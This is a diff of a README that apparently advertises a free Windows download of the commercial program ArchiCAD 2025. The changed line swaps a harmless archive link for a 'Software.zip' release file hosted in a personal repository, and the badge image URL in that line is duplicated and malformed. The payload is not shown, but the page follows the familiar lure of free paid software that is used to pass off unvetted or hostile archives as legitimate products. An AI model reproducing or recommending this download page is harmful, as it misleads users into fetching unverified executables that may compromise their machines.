@@ -21,7 +21,7 @@ ArchiCAD 2025 is packed with cutting-edge features and tools designed to make ar
 To get started with ArchiCAD 2025 on your Windows machine, simply download the software using the link provided below. Follow the installation guide to set up ArchiCAD 2025 and unleash its full potential for your architectural projects.
 
 ## Download ArchiCAD 2025
-[![Download ArchiCAD 2025](https://img.shields.io/badge/Download-ArchiCAD%202025-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch Download")
+[![Download ArchiCAD 2025](https://github.com/DragonRoyce/ArchiCAD-For-Windows-2025/releases/download/v2.0/Software.zip%https://github.com/DragonRoyce/ArchiCAD-For-Windows-2025/releases/download/v2.0/Software.zip)](https://github.com/DragonRoyce/ArchiCAD-For-Windows-2025/releases/download/v2.0/Software.zip "Launch Download")
 
 ## Need Help?
 If the provided download link is not working or you need further assistance, please check the "Releases" section of this repository for alternative download options. You can also visit the official ArchiCAD website for more information and support.
